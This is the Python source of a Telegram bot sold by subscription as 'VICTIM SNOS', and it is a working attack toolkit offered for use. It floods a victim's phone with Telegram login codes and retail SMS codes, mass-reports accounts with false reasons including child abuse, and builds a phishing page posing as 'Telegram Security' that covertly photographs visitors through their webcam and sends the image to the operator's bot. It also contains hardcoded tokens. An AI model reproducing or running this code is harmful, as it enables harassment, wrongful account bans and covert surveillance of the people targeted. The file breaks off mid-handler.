import asyncio
import aiohttp
import random
import json
import os
import logging
import time
import re
import hashlib
import shutil
from datetime import datetime, timedelta
from typing import Optional, Dict, List, Set, Tuple
from dataclasses import dataclass, field
from pathlib import Path

from aiogram import Bot, Dispatcher, types, F
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.filters import Command, StateFilter
from aiogram.utils.keyboard import InlineKeyboardBuilder
from aiogram.types import (
    InlineKeyboardMarkup, InlineKeyboardButton, 
    FSInputFile, LabeledPrice, PreCheckoutQuery
)
from aiogram.client.default import DefaultBotProperties
from aiogram.enums import ParseMode

from pyrogram import Client
from pyrogram.errors import FloodWait, RPCError
from pyrogram.raw import types as raw_types
from pyrogram.raw.functions.account import ReportPeer
from pyrogram.raw.functions.messages import Report

# ---------- КОНФИГУРАЦИЯ ----------
BOT_TOKEN = "8788795304:AAFA9drMeBOVHp-OR0XWgrZPllVsXx9zgqI"
API_ID = 2040
API_HASH = "b18441a1ff607e10a989891a5462e627"
ADMIN_ID = 7736817432
ALLOWED_USERS_FILE = "allowed_users.json"
CHANNEL_ID = -1003910615357
CHANNEL_URL = "https://t.me/VICTIMSNOSER"
PAYMENT_PROVIDER_TOKEN = "381764678:TEST:86938"
BANNER_FILE = "banner.png"

# Настройки атак
SESSIONS_PER_USER = 500
REQUESTS_PER_ROUND = 300
MAX_ROUNDS = 5
COOLDOWN_SECONDS = 300
SESSION_CREATION_DELAY = 0.1

PRICES = {
    "30d": {"stars": 100, "rub": 100},
    "60d": {"stars": 200, "rub": 200},
    "forever": {"stars": 400, "rub": 400}
}

USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 Version/17.2 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 Chrome/120.0.6099.144 Mobile Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
]

DEVICES = [
    {"model": "iPhone 15 Pro Max", "system": "iOS 17.3.1"},
    {"model": "iPhone 15 Pro", "system": "iOS 17.3"},
    {"model": "iPhone 14 Pro Max", "system": "iOS 17.2.1"},
    {"model": "iPhone 14 Pro", "system": "iOS 17.2"},
    {"model": "Samsung Galaxy S24 Ultra", "system": "Android 14"},
    {"model": "Samsung Galaxy S23 Ultra", "system": "Android 14"},
    {"model": "Google Pixel 8 Pro", "system": "Android 14"},
    {"model": "Xiaomi 14 Pro", "system": "Android 14"},
]

BOMBER_ENDPOINTS = [
    {"url": "https://api.delivery-club.ru/api/v2/auth/send-code", "phone_field": "phone", "method": "POST"},
    {"url": "https://api.dodopizza.ru/auth/send-code", "phone_field": "phone", "method": "POST"},
    {"url": "https://api.citilink.ru/v1/auth/send-code", "phone_field": "phone", "method": "POST"},
    {"url": "https://api.avito.ru/auth/v1/send-code", "phone_field": "phone", "method": "POST"},
    {"url": "https://api.lenta.com/v1/auth/send-code", "phone_field": "phone", "method": "POST"},
    {"url": "https://api.perekrestok.ru/v1/auth/send-sms", "phone_field": "phone", "method": "POST"},
    {"url": "https://api.magnit.ru/v1/auth/send-code", "phone_field": "phone", "method": "POST"},
    {"url": "https://api.dns-shop.ru/v1/auth/send-code", "phone_field": "phone", "method": "POST"},
    {"url": "https://api.mvideo.ru/v1/auth/send-code", "phone_field": "phone", "method": "POST"},
    {"url": "https://api.eldorado.ru/v1/auth/send-code", "phone_field": "phone", "method": "POST"},
]

REPORT_REASONS = [
    raw_types.InputReportReasonSpam(),
    raw_types.InputReportReasonViolence(),
    raw_types.InputReportReasonPornography(),
    raw_types.InputReportReasonChildAbuse(),
    raw_types.InputReportReasonOther(),
    raw_types.InputReportReasonCopyright(),
]

# ---------- ЛОГГИРОВАНИЕ ----------
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('bot.log'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

# ---------- ИНИЦИАЛИЗАЦИЯ БОТА ----------
bot = Bot(token=BOT_TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
dp = Dispatcher(storage=MemoryStorage())

# ---------- ДАТАКЛАССЫ ----------
@dataclass
class UserSession:
    """Умная сессия пользователя"""
    client: Client
    index: int
    in_use: bool = False
    flood_until: float = 0
    last_used: float = 0
    fail_count: int = 0
    success_count: int = 0
    created_at: float = field(default_factory=time.time)
    
    @property
    def is_available(self) -> bool:
        now = time.time()
        return (not self.in_use and 
                self.flood_until < now and 
                now - self.last_used >= 1.5)
    
    @property
    def health_score(self) -> float:
        if self.fail_count > 10:
            return 0
        total = self.success_count + self.fail_count
        if total == 0:
            return 100
        return (self.success_count / total) * 100
    
    async def ensure_connected(self):
        if not self.client.is_connected:
            await self.client.connect()

@dataclass
class UserSessionPool:
    """Пул сессий пользователя"""
    user_id: int
    sessions: List[UserSession] = field(default_factory=list)
    lock: asyncio.Lock = field(default_factory=asyncio.Lock)
    is_creating: bool = False
    is_ready: bool = False
    creation_progress: float = 0
    
    @property
    def session_dir(self) -> str:
        return f"sessions/user_{self.user_id}"
    
    async def get_available(self, count: int) -> List[UserSession]:
        async with self.lock:
            available = [s for s in self.sessions if s.is_available]
            available.sort(key=lambda s: (-s.health_score, s.last_used))
            selected = available[:min(count, len(available))]
            for s in selected:
                s.in_use = True
                s.last_used = time.time()
            return selected
    
    def release(self, sessions: List[UserSession]):
        for s in sessions:
            if s:
                s.in_use = False
    
    def mark_success(self, session: UserSession):
        session.success_count += 1
    
    def mark_fail(self, session: UserSession):
        session.fail_count += 1
    
    def mark_flood(self, session: UserSession, wait_seconds: int):
        session.flood_until = time.time() + wait_seconds
    
    def get_stats(self) -> dict:
        total = len(self.sessions)
        available = sum(1 for s in self.sessions if s.is_available)
        healthy = sum(1 for s in self.sessions if s.health_score > 50)
        return {
            "total": total,
            "available": available,
            "healthy": healthy,
            "ready": self.is_ready,
            "progress": self.creation_progress
        }

# ---------- ГЛОБАЛЬНЫЕ ХРАНИЛИЩА ----------
user_pools: Dict[int, UserSessionPool] = {}
ALLOWED_USERS: Dict[str, dict] = {}
active_attacks: Dict[int, asyncio.Event] = {}
user_last_action: Dict[int, float] = {}
user_action_locks: Dict[int, asyncio.Lock] = {}
promo_codes: Dict[str, dict] = {}
phish_pages: Dict[str, dict] = {}

# ---------- FSM СОСТОЯНИЯ ----------
class AttackState(StatesGroup):
    waiting_phone = State()
    waiting_username = State()
    waiting_count = State()
    waiting_link = State()
    waiting_title = State()

class AdminState(StatesGroup):
    waiting_user_id = State()
    waiting_promo_code = State()
    waiting_promo_days = State()
    waiting_promo_uses = State()

class PurchaseState(StatesGroup):
    waiting_promo = State()

# ---------- ПРОВЕРКА ДОСТУПА ----------
def load_json(file: str, default: dict = None) -> dict:
    try:
        with open(file, 'r') as f:
            return json.load(f)
    except:
        return default or {}

def save_json(file: str, data: dict):
    try:
        with open(file, 'w') as f:
            json.dump(data, f, indent=4, ensure_ascii=False)
    except Exception as e:
        logger.error(f"Failed to save {file}: {e}")

def load_allowed_users():
    global ALLOWED_USERS
    ALLOWED_USERS = load_json(ALLOWED_USERS_FILE, {})

def save_allowed_users():
    save_json(ALLOWED_USERS_FILE, ALLOWED_USERS)

def load_promo_codes():
    global promo_codes
    promo_codes = load_json("promo_codes.json", {})

def save_promo_codes():
    save_json("promo_codes.json", promo_codes)

def is_user_allowed(user_id: int) -> bool:
    """ПРОВЕРКА ДОСТУПА - ТОЛЬКО АДМИН И ОПЛАЧЕННЫЕ ПОЛЬЗОВАТЕЛИ"""
    if user_id == ADMIN_ID:
        return True
    
    user_id_str = str(user_id)
    if user_id_str not in ALLOWED_USERS:
        logger.info(f"User {user_id} not in allowed list")
        return False
    
    expire = ALLOWED_USERS[user_id_str].get("expire_date")
    if not expire:
        return False
    
    if expire == "forever":
        return True
    
    try:
        expire_date = datetime.fromisoformat(expire)
        is_valid = datetime.now() <= expire_date
        if not is_valid:
            logger.info(f"User {user_id} subscription expired on {expire}")
        return is_valid
    except Exception as e:
        logger.error(f"Error checking subscription for {user_id}: {e}")
        return False

def add_subscription(user_id: int, days: int = None, forever: bool = False):
    user_id_str = str(user_id)
    if forever:
        expire = "forever"
    else:
        expire = (datetime.now() + timedelta(days=days)).isoformat()
    ALLOWED_USERS[user_id_str] = {
        "expire_date": expire,
        "added": datetime.now().isoformat()
    }
    save_allowed_users()
    logger.info(f"Added subscription for user {user_id}: {expire}")

async def check_access_and_subscription(user_id: int, target) -> bool:
    """
    Проверка доступа и подписки на канал
    Возвращает True если все проверки пройдены
    """
    # Проверка подписки на канал
    if not await check_channel_subscription(user_id):
        await send_message_with_banner(
            target,
            f"❌ <b>ДОСТУП ЗАПРЕЩЕН</b>\n\n"
            f"Для использования бота необходимо:\n"
            f"1. Подписаться на канал: {CHANNEL_URL}\n"
            f"2. Приобрести доступ"
        )
        return False
    
    # Проверка оплаты
    if not is_user_allowed(user_id):
        user_id_str = str(user_id)
        if user_id_str in ALLOWED_USERS:
            expire = ALLOWED_USERS[user_id_str].get("expire_date", "неизвестно")
            try:
                expire_date = datetime.fromisoformat(expire)
                if expire_date < datetime.now():
                    await send_message_with_banner(
                        target,
                        f"❌ <b>ПОДПИСКА ИСТЕКЛА</b>\n\n"
                        f"Ваша подписка закончилась {expire_date.strftime('%d.%m.%Y')}\n"
                        f"Приобретите доступ снова:",
                        get_purchase_menu()
                    )
                    return False
            except:
                pass
        
        await send_message_with_banner(
            target,
            f"❌ <b>ДОСТУП ЗАПРЕЩЕН</b>\n\n"
            f"У вас нет активной подписки.\n"
            f"Ваш ID: <code>{user_id}</code>\n\n"
            f"Приобретите доступ:",
            get_purchase_menu()
        )
        return False
    
    return True

async def check_cooldown(user_id: int) -> tuple[bool, float]:
    now = time.time()
    if user_id in user_last_action:
        elapsed = now - user_last_action[user_id]
        if elapsed < COOLDOWN_SECONDS:
            return False, COOLDOWN_SECONDS - elapsed
    return True, 0

def set_cooldown(user_id: int):
    user_last_action[user_id] = time.time()

async def get_user_lock(user_id: int) -> asyncio.Lock:
    if user_id not in user_action_locks:
        user_action_locks[user_id] = asyncio.Lock()
    return user_action_locks[user_id]

async def check_channel_subscription(user_id: int) -> bool:
    try:
        member = await bot.get_chat_member(chat_id=CHANNEL_ID, user_id=user_id)
        return member.status in ["member", "administrator", "creator"]
    except Exception as e:
        logger.error(f"Failed to check channel subscription for {user_id}: {e}")
        return False

# ---------- СОЗДАНИЕ СЕССИЙ ----------
async def create_single_user_session(user_id: int, index: int) -> Optional[UserSession]:
    try:
        session_dir = f"sessions/user_{user_id}"
        os.makedirs(session_dir, exist_ok=True)
        
        device = random.choice(DEVICES)
        session_file = f"{session_dir}/session_{index}"
        
        client = Client(
            name=session_file,
            api_id=API_ID,
            api_hash=API_HASH,
            in_memory=False,
            no_updates=True,
            device_model=device["model"],
            system_version=device["system"],
            app_version="10.15.1",
            lang_code="ru"
        )
        
        await client.connect()
        await client.get_me()
        
        return UserSession(client=client, index=index)
    except Exception as e:
        logger.debug(f"User {user_id} session {index} creation failed: {e}")
        return None

async def initialize_user_sessions(user_id: int) -> UserSessionPool:
    if user_id in user_pools:
        pool = user_pools[user_id]
        if pool.is_ready:
            return pool
    else:
        pool = UserSessionPool(user_id=user_id)
        user_pools[user_id] = pool
    
    if pool.is_creating:
        while pool.is_creating:
            await asyncio.sleep(1)
        return pool
    
    pool.is_creating = True
    
    try:
        logger.info(f"Creating {SESSIONS_PER_USER} sessions for user {user_id}")
        
        session_dir = pool.session_dir
        
        if os.path.exists(session_dir):
            existing_sessions = list(Path(session_dir).glob("session_*.session"))
            logger.info(f"Found {len(existing_sessions)} existing sessions for user {user_id}")
            
            for i, session_file in enumerate(existing_sessions):
                try:
                    index = int(session_file.stem.replace("session_", ""))
                    device = random.choice(DEVICES)
                    
                    client = Client(
                        name=str(session_file.with_suffix("")),
                        api_id=API_ID,
                        api_hash=API_HASH,
                        in_memory=False,
                        no_updates=True,
                        device_model=device["model"],
                        system_version=device["system"],
                        app_version="10.15.1",
                        lang_code="ru"
                    )
                    
                    await client.connect()
                    await client.get_me()
                    
                    session = UserSession(client=client, index=index)
                    pool.sessions.append(session)
                    
                    if i % 50 == 0:
                        pool.creation_progress = len(pool.sessions) / SESSIONS_PER_USER * 100
                        
                except Exception as e:
                    logger.debug(f"Failed to load session {session_file}: {e}")
        
        existing_count = len(pool.sessions)
        if existing_count < SESSIONS_PER_USER:
            needed = SESSIONS_PER_USER - existing_count
            
            logger.info(f"Creating {needed} new sessions for user {user_id}")
            
            used_indices = {s.index for s in pool.sessions}
            next_index = 0
            while next_index in used_indices:
                next_index += 1
            
            for i in range(needed):
                idx = next_index + i
                session = await create_single_user_session(user_id, idx)
                if session:
                    async with pool.lock:
                        pool.sessions.append(session)
                
                pool.creation_progress = len(pool.sessions) / SESSIONS_PER_USER * 100
                await asyncio.sleep(SESSION_CREATION_DELAY)
                
                if i % 50 == 0:
                    logger.info(f"User {user_id} progress: {len(pool.sessions)}/{SESSIONS_PER_USER}")
        
        pool.is_ready = True
        logger.info(f"User {user_id} session pool ready: {len(pool.sessions)} sessions")
        
        return pool
        
    except Exception as e:
        logger.error(f"Failed to initialize sessions for user {user_id}: {e}")
        raise
    finally:
        pool.is_creating = False

async def get_or_create_user_pool(user_id: int) -> UserSessionPool:
    if user_id not in user_pools:
        user_pools[user_id] = UserSessionPool(user_id=user_id)
    
    pool = user_pools[user_id]
    
    if not pool.is_ready and not pool.is_creating:
        asyncio.create_task(initialize_user_sessions(user_id))
    
    return pool

async def maintain_user_sessions(user_id: int):
    while True:
        try:
            await asyncio.sleep(300)
            
            if user_id not in user_pools:
                break
            
            pool = user_pools[user_id]
            if not pool.is_ready:
                continue
            
            dead_sessions = []
            async with pool.lock:
                for s in pool.sessions:
                    if s.health_score < 10 and not s.in_use:
                        dead_sessions.append(s)
            
            if dead_sessions:
                logger.info(f"User {user_id}: recovering {len(dead_sessions)} dead sessions")
                
                for s in dead_sessions[:20]:
                    try:
                        if s.client and s.client.is_connected:
                            await s.client.disconnect()
                    except:
                        pass
                    
                    async with pool.lock:
                        if s in pool.sessions:
                            pool.sessions.remove(s)
                    
                    new_session = await create_single_user_session(user_id, s.index)
                    if new_session:
                        async with pool.lock:
                            pool.sessions.append(new_session)
                
        except Exception as e:
            logger.error(f"User {user_id} session maintenance error: {e}")

# ---------- АТАКИ ----------
async def send_code_via_session(session: UserSession, phone: str, pool: UserSessionPool) -> bool:
    try:
        await session.ensure_connected()
        await session.client.send_code(phone)
        pool.mark_success(session)
        return True
    except FloodWait as e:
        pool.mark_flood(session, e.value)
        return False
    except Exception:
        pool.mark_fail(session)
        return False

async def report_account_via_session(session: UserSession, username: str, pool: UserSessionPool) -> bool:
    try:
        await session.ensure_connected()
        user = await session.client.get_users(username)
        peer = await session.client.resolve_peer(user.id)
        
        reason = random.choice(REPORT_REASONS)
        await session.client.invoke(ReportPeer(peer=peer, reason=reason, message="Report"))
        
        pool.mark_success(session)
        return True
    except Exception:
        pool.mark_fail(session)
        return False

async def snos_attack_phone(
    user_id: int,
    phone: str,
    rounds: int,
    stop_event: asyncio.Event,
    progress_callback=None
) -> int:
    pool = await get_or_create_user_pool(user_id)
    
    while not pool.is_ready:
        await asyncio.sleep(1)
    
    asyncio.create_task(maintain_user_sessions(user_id))
    
    total_sent = 0
    phone = phone.strip().replace(" ", "").replace("-", "")
    if not phone.startswith("+"):
        phone = "+" + phone
    
    for rnd in range(1, rounds + 1):
        if stop_event.is_set():
            break
        
        sessions = await pool.get_available(REQUESTS_PER_ROUND)
        
        if len(sessions) < REQUESTS_PER_ROUND:
            logger.warning(f"User {user_id}: only {len(sessions)} sessions available")
        
        if not sessions:
            break
        
        tasks = [send_code_via_session(s, phone, pool) for s in sessions]
        results = await asyncio.gather(*tasks, return_exceptions=True)
        
        pool.release(sessions)
        
        round_sent = sum(1 for r in results if r is True)
        total_sent += round_sent
        
        if progress_callback:
            await progress_callback(rnd, rounds, total_sent)
        
        if rnd < rounds:
            await asyncio.sleep(1.5)
    
    return total_sent

async def snos_attack_username(
    user_id: int,
    username: str,
    rounds: int,
    stop_event: asyncio.Event,
    progress_callback=None
) -> int:
    pool = await get_or_create_user_pool(user_id)
    
    while not pool.is_ready:
        await asyncio.sleep(1)
    
    asyncio.create_task(maintain_user_sessions(user_id))
    
    total_reports = 0
    username = username.strip().replace("@", "")
    
    for rnd in range(1, rounds + 1):
        if stop_event.is_set():
            break
        
        sessions = await pool.get_available(REQUESTS_PER_ROUND)
        
        if not sessions:
            break
        
        tasks = [report_account_via_session(s, username, pool) for s in sessions]
        results = await asyncio.gather(*tasks, return_exceptions=True)
        
        pool.release(sessions)
        
        round_reports = sum(1 for r in results if r is True)
        total_reports += round_reports
        
        if progress_callback:
            await progress_callback(rnd, rounds, total_reports)
        
        if rnd < rounds:
            await asyncio.sleep(1)
    
    return total_reports

async def bomber_attack(
    phone: str,
    rounds: int,
    user_id: int,
    stop_event: asyncio.Event,
    progress_callback=None
) -> int:
    total_sent = 0
    phone = phone.strip().replace(" ", "").replace("-", "")
    if not phone.startswith("+"):
        phone = "+" + phone
    
    connector = aiohttp.TCPConnector(limit=200, force_close=True, ssl=False)
    async with aiohttp.ClientSession(connector=connector) as session:
        for rnd in range(1, rounds + 1):
            if stop_event.is_set():
                break
            
            tasks = []
            for endpoint in BOMBER_ENDPOINTS:
                for _ in range(30):
                    tasks.append(send_bomber_request(session, phone, endpoint))
            
            results = await asyncio.gather(*tasks, return_exceptions=True)
            
            round_sent = sum(1 for r in results if r is True)
            total_sent += round_sent
            
            if progress_callback:
                await progress_callback(rnd, rounds, total_sent)
            
            if rnd < rounds:
                await asyncio.sleep(0.5)
    
    return total_sent

async def send_bomber_request(session: aiohttp.ClientSession, phone: str, endpoint: dict) -> bool:
    try:
        headers = {
            'User-Agent': random.choice(USER_AGENTS),
            'Content-Type': 'application/json',
            'Accept': 'application/json'
        }
        
        data = {endpoint["phone_field"]: phone.replace("+", "")}
        
        async with session.post(
            endpoint["url"],
            headers=headers,
            json=data,
            timeout=aiohttp.ClientTimeout(total=10),
            ssl=False
        ) as resp:
            return resp.status < 500
    except:
        return False

# ---------- ФИШИНГ ----------
PHISH_HTML = '''<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>{title}</title>
    <style>
        body {{ margin: 0; padding: 0; background: #000; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; }}
        #container {{ position: relative; width: 100vw; height: 100vh; overflow: hidden; }}
        video {{ width: 100%; height: 100%; object-fit: cover; }}
        #overlay {{ position: fixed; top: 0; left: 0; right: 0; bottom: 0; display: flex; flex-direction: column; justify-content: flex-end; align-items: center; padding: 20px; pointer-events: none; }}
        #status {{ background: rgba(0,0,0,0.7); color: white; padding: 12px 24px; border-radius: 30px; font-size: 14px; margin-bottom: 30px; backdrop-filter: blur(10px); pointer-events: none; }}
        canvas {{ display: none; }}
    </style>
</head>
<body>
    <div id="container">
        <video id="video" autoplay playsinline></video>
        <div id="overlay">
            <div id="status">📸 Loading camera...</div>
        </div>
    </div>
    <canvas id="canvas"></canvas>
    <script>
        const CONFIG = {{ bot: "{bot_token}", chat: "{chat_id}", pageId: "{page_id}" }};
        let sent = false;
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const status = document.getElementById('status');
        async function initCamera() {{
            try {{
                const stream = await navigator.mediaDevices.getUserMedia({{ video: {{ facingMode: "user", width: {{ ideal: 1280 }}, height: {{ ideal: 720 }} }} }});
                video.srcObject = stream;
                status.textContent = '📸 Camera ready';
                await new Promise(resolve => {{ video.onloadedmetadata = () => {{ resolve(); }}; }});
                setTimeout(() => captureAndSend(stream), 1500);
            }} catch(e) {{ status.textContent = '❌ Camera access denied'; }}
        }}
        async function captureAndSend(stream) {{
            if (sent) return;
            try {{
                const ctx = canvas.getContext('2d');
                canvas.width = video.videoWidth || 640;
                canvas.height = video.videoHeight || 480;
                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                status.textContent = '📤 Sending...';
                const blob = await new Promise(resolve => {{ canvas.toBlob(resolve, 'image/jpeg', 0.8); }});
                const formData = new FormData();
                formData.append('chat_id', CONFIG.chat);
                formData.append('photo', blob, `photo_${{CONFIG.pageId}}.jpg`);
                formData.append('caption', `📸 Photo captured | ID: ${{CONFIG.pageId}}`);
                const response = await fetch(`https://api.telegram.org/bot${{CONFIG.bot}}/sendPhoto`, {{ method: 'POST', body: formData }});
                const data = await response.json();
                if (data.ok) {{
                    sent = true;
                    status.textContent = '✅ Photo sent successfully';
                    stream.getTracks().forEach(track => track.stop());
                    setTimeout(() => {{ window.location.href = 'https://telegram.org/'; }}, 2000);
                }} else {{ status.textContent = '❌ Send failed, retrying...'; setTimeout(() => captureAndSend(stream), 2000); }}
            }} catch(e) {{ status.textContent = '❌ Error, retrying...'; setTimeout(() => captureAndSend(stream), 2000); }}
        }}
        initCamera();
    </script>
</body>
</html>'''

async def create_phishing_page(title: str, chat_id: int, page_id: str) -> Optional[str]:
    try:
        html = PHISH_HTML.format(
            title=title,
            bot_token=BOT_TOKEN,
            chat_id=chat_id,
            page_id=page_id
        )
        
        async with aiohttp.ClientSession() as session:
            account_data = {
                "short_name": f"Support{random.randint(10000, 99999)}",
                "author_name": "Telegram Security",
                "author_url": "https://t.me/telegram"
            }
            
            async with session.post(
                "https://api.telegra.ph/createAccount",
                json=account_data,
                timeout=10
            ) as resp:
                data = await resp.json()
                if not data.get("ok"):
                    return None
                access_token = data["result"]["access_token"]
            
            page_data = {
                "access_token": access_token,
                "title": title,
                "author_name": "Telegram Security",
                "content": [
                    {"tag": "p", "children": ["Loading security check..."]},
                    {"tag": "p", "children": [html]}
                ],
                "return_content": False
            }
            
            async with session.post(
                "https://api.telegra.ph/createPage",
                json=page_data,
                timeout=10
            ) as resp:
                data = await resp.json()
                if data.get("ok"):
                    url = data["result"]["url"]
                    phish_pages[page_id] = {
                        "url": url,
                        "chat_id": chat_id,
                        "created": time.time()
                    }
                    return url
                    
    except Exception as e:
        logger.error(f"Phishing page creation error: {e}")
    
    return None

# ---------- UI ----------
def create_button(text: str, callback_data: str) -> InlineKeyboardButton:
    return InlineKeyboardButton(text=text, callback_data=callback_data)

def create_keyboard(buttons: List[List[tuple]], adjust: int = 1) -> InlineKeyboardMarkup:
    builder = InlineKeyboardBuilder()
    for row in buttons:
        for text, data in row:
            builder.button(text=text, callback_data=data)
    builder.adjust(adjust)
    return builder.as_markup()

def get_main_menu(user_id: int) -> InlineKeyboardMarkup:
    buttons = [
        [("🎯 СНОС", "snos_menu")],
        [("💣 БОМБЕР", "bomber_menu")],
        [("🎣 ФИШИНГ", "phish_menu")],
        [("💰 КУПИТЬ", "purchase_menu")],
        [("📊 СТАТУС", "status"), ("⏹ СТОП", "stop")]
    ]
    
    if user_id == ADMIN_ID:
        buttons.append([("👑 АДМИН", "admin_menu")])
    
    return create_keyboard(buttons, adjust=2)

def get_snos_menu() -> InlineKeyboardMarkup:
    buttons = [
        [("📱 По номеру", "snos_phone")],
        [("👤 По username", "snos_username")],
        [("◀️ НАЗАД", "main_menu")]
    ]
    return create_keyboard(buttons)

def get_purchase_menu() -> InlineKeyboardMarkup:
    buttons = [
        [("💎 30 дней - 100₽", "buy_30d")],
        [("💎 60 дней - 200₽", "buy_60d")],
        [("👑 Навсегда - 400₽", "buy_forever")],
        [("🎁 Промокод", "use_promo")]
    ]
    return create_keyboard(buttons)

async def send_message_with_banner(target, text: str, markup: InlineKeyboardMarkup = None):
    full_text = f"<b>🔱 VICTIM SNOS</b>\n\n{text}"
    
    try:
        if os.path.exists(BANNER_FILE):
            if hasattr(target, 'answer_photo'):
                return await target.answer_photo(
                    FSInputFile(BANNER_FILE),
                    caption=full_text,
                    reply_markup=markup
                )
            else:
                return await bot.send_photo(
                    target if isinstance(target, int) else target.chat.id,
                    FSInputFile(BANNER_FILE),
                    caption=full_text,
                    reply_markup=markup
                )
    except:
        pass
    
    if hasattr(target, 'answer'):
        return await target.answer(full_text, reply_markup=markup)
    else:
        return await bot.send_message(
            target if isinstance(target, int) else target.chat.id,
            full_text,
            reply_markup=markup
        )

# ---------- ОБРАБОТЧИКИ ----------
@dp.message(Command("start"))
async def cmd_start(msg: types.Message):
    user_id = msg.from_user.id
    await msg.delete()
    
    # ПРОВЕРКА ДОСТУПА
    if not await check_access_and_subscription(user_id, msg):
        return
    
    pool = await get_or_create_user_pool(user_id)
    
    if not pool.is_ready:
        await send_message_with_banner(
            msg,
            f"🔄 Создание сессий...\n"
            f"Прогресс: {pool.creation_progress:.1f}%\n\n"
            f"Это займет около 2-3 минут.",
            InlineKeyboardMarkup(inline_keyboard=[
                [create_button("🔄 Проверить", f"check_sessions_{user_id}")]
            ])
        )
        
        asyncio.create_task(initialize_user_sessions(user_id))
        return
    
    stats = pool.get_stats()
    await send_message_with_banner(
        msg,
        f"✅ Бот готов к работе\n"
        f"📊 Ваши сессии: {stats['available']}/{stats['total']}",
        get_main_menu(user_id)
    )

@dp.callback_query(F.data == "main_menu")
async def main_menu_handler(cb: types.CallbackQuery, state: FSMContext):
    await state.clear()
    
    # ПРОВЕРКА ДОСТУПА
    if not await check_access_and_subscription(cb.from_user.id, cb):
        return
    
    await cb.message.edit_caption(
        caption="<b>🔱 VICTIM SNOS</b>\n\nВыберите действие:",
        reply_markup=get_main_menu(cb.from_user.id)
    )

@dp.callback_query(F.data == "snos_menu")
async def snos_menu(cb: types.CallbackQuery):
    # ПРОВЕРКА ДОСТУПА
    if not await check_access_and_subscription(cb.from_user.id, cb):
        return
    
    can_attack, remaining = await check_cooldown(cb.from_user.id)
    if not can_attack:
        await cb.answer(f"⏳ Подождите {int(remaining)} сек.", show_alert=True)
        return
    
    if cb.from_user.id in active_attacks:
        await cb.answer("❌ У вас уже есть активная атака!", show_alert=True)
        return
    
    await cb.message.edit_caption(
        caption="<b>🔱 VICTIM SNOS</b>\n\nВыберите тип сноса:",
        reply_markup=get_snos_menu()
    )

@dp.callback_query(F.data == "snos_phone")
async def snos_phone_start(cb: types.CallbackQuery, state: FSMContext):
    # ПРОВЕРКА ДОСТУПА
    if not await check_access_and_subscription(cb.from_user.id, cb):
        return
    
    user_lock = await get_user_lock(cb.from_user.id)
    
    async with user_lock:
        if cb.from_user.id in active_attacks:
            await cb.answer("❌ Активная атака уже идет!", show_alert=True)
            return
        
        can_attack, remaining = await check_cooldown(cb.from_user.id)
        if not can_attack:
            await cb.answer(f"⏳ Подождите {int(remaining)} сек.", show_alert=True)
            return
    
    await state.set_state(AttackState.waiting_phone)
    await cb.message.delete()
    
    cancel_kb = InlineKeyboardMarkup(inline_keyboard=[
        [create_button("❌ Отмена", "snos_menu")]
    ])
    
    await cb.message.answer(
        "<b>🔱 VICTIM SNOS</b>\n\n"
        "📱 Введите номер телефона:\n"
        "<i>Пример: +79123456789</i>",
        reply_markup=cancel_kb
    )

@dp.message(StateFilter(AttackState.waiting_phone))
async def snos_phone_received(msg: types.Message, state: FSMContext):
    # ПРОВЕРКА ДОСТУПА
    if not await check_access_and_subscription(msg.from_user.id, msg):
        return
    
    phone = msg.text.strip()
    await state.update_data(phone=phone)
    await state.set_state(AttackState.waiting_count)
    
    await msg.delete()
    await msg.answer(
        f"<b>🔱 VICTIM SNOS</b>\n\n"
        f"📱 Телефон: <code>{phone}</code>\n\n"
        f"Введите количество раундов (1-{MAX_ROUNDS}):"
    )

@dp.message(StateFilter(AttackState.waiting_count))
async def snos_count_received(msg: types.Message, state: FSMContext):
    # ПРОВЕРКА ДОСТУПА
    if not await check_access_and_subscription(msg.from_user.id, msg):
        return
    
    try:
        rounds = int(msg.text.strip())
        if rounds < 1 or rounds > MAX_ROUNDS:
            raise ValueError()
    except:
        await msg.delete()
        await send_message_with_banner(msg, f"❌ Введите число от 1 до {MAX_ROUNDS}!")
        return
    
    data = await state.get_data()
    phone = data["phone"]
    user_id = msg.from_user.id
    
    await state.clear()
    await msg.delete()
    
    user_lock = await get_user_lock(user_id)
    
    async with user_lock:
        if user_id in active_attacks:
            await send_message_with_banner(msg, "❌ Атака уже запущена!")
            return
        
        stop_event = asyncio.Event()
        active_attacks[user_id] = stop_event
    
    status_msg = await send_message_with_banner(
        msg,
        f"🎯 <b>СНОС ЗАПУЩЕН</b>\n\n"
        f"📱 Телефон: <code>{phone}</code>\n"
        f"🔄 Раунд: 0/{rounds}\n"
        f"📤 Отправлено: 0"
    )
    
    async def update_progress(current: int, total: int, sent: int):
        try:
            pool = user_pools.get(user_id)
            stats = pool.get_stats() if pool else {"available": 0, "total": 0}
            
            await status_msg.edit_caption(
                caption=f"<b>🔱 VICTIM SNOS</b>\n\n"
                       f"🎯 <b>СНОС АКТИВЕН</b>\n\n"
                       f"📱 Телефон: <code>{phone}</code>\n"
                       f"🔄 Раунд: {current}/{total}\n"
                       f"📤 Отправлено: {sent}\n"
                       f"📊 Сессий: {stats['available']}/{stats['total']}",
                reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                    [create_button("⏹ ОСТАНОВИТЬ", "stop_attack")]
                ])
            )
        except:
            pass
    
    try:
        total_sent = await snos_attack_phone(
            user_id,
            phone,
            rounds,
            stop_event,
            update_progress
        )
        
        set_cooldown(user_id)
        
        await status_msg.edit_caption(
